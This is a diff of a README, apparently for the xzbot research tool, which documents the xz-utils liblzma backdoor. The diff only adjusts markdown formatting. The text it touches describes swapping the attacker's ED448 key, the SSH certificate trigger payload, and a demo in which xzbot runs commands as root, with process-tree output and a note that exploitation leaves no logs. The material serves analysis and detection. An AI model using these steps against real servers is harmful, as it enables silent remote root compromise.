@@ -603,12 +603,15 @@ The attacker's ED448 key is:
 34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
 10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
 20 d3 2c 60 2b 2c 6d 31 00
+```
 We will replace this key with our own (generated with seed=0):
 
 5b 3a fe 03 87 8a 49 b2 82 32 d4 f1 a4 42 ae bd
 e1 09 f8 07 ac ef 7d fd 9a 7f 65 b9 62 fe 52 d6
 54 73 12 ca ce cf f0 43 37 50 8f 9d 25 29 a8 f1
 66 91 69 b2 1c 32 c4 80 00
+```
+
 To start, download a backdoored libxzma shared object, e.g. from https://snapshot.debian.org/package/xz-utils/5.6.1-1. Then run the patch script. See assets/ for examples.
 
 $ pip install pwntools
@@ -620,7 +623,8 @@ Generated patched so: liblzma.so.5.6.1.patch
 Then run sshd using this modified liblzma.so.5.6.1.patch shared object.
 
 backdoor format
-The backdoor can be triggered by connecting with an SSH certificate with a payload in the CA signing key N value. This payload must be encrypted and signed with the attacker's ED448 key.
+The backdoor can be triggered by connecting with an SSH certificate with a payload in the CA signing key N value. 
+This payload must be encrypted and signed with the attacker's ED448 key.
 
 The structure has the following format:
 
@@ -649,6 +653,7 @@ The first 5 bytes of the command
 The first 32 bytes of the sha256 hash of the server's hostkey
 backdoor demo
 $ go install github.com/amlweems/xzbot@latest
+```
 $ xzbot -h
 Usage of xzbot:
   -addr string
@@ -695,15 +700,21 @@ $ cat /tmp/.xz
 uid=0(root) gid=0(root) groups=0(root)
 The process tree after exploitation looks different from a normal sshd process tree:
 
+```
 # normal process tree
+```
 $ ssh foo@bar
 $ ps -ef --forest
 root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
 root        1026     765  7 18:51 ?        00:00:00  \_ sshd: foo [priv]
 foo         1050    1026  0 18:51 ?        00:00:00      \_ sshd: foo@pts/1
 foo         1051    1050  0 18:51 pts/1    00:00:00          \_ -bash
+```
+
 
 # backdoor process tree
+
+```
 $ xzbot -cmd 'sleep 60'
 $ ps -ef --forest
 root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
@@ -712,6 +723,8 @@ sshd         942     941  0 18:04 ?        00:00:00      \_ sshd: root [net]
 root         943     941  0 18:04 ?        00:00:00      \_ sh -c sleep 60
 root         944     943  0 18:04 ?        00:00:00          \_ sleep 60
 Note: successful exploitation does not generate any INFO or higher log entries.
+```
+
 
 References
 https://www.openwall.com/lists/oss-security/2024/03/29/4
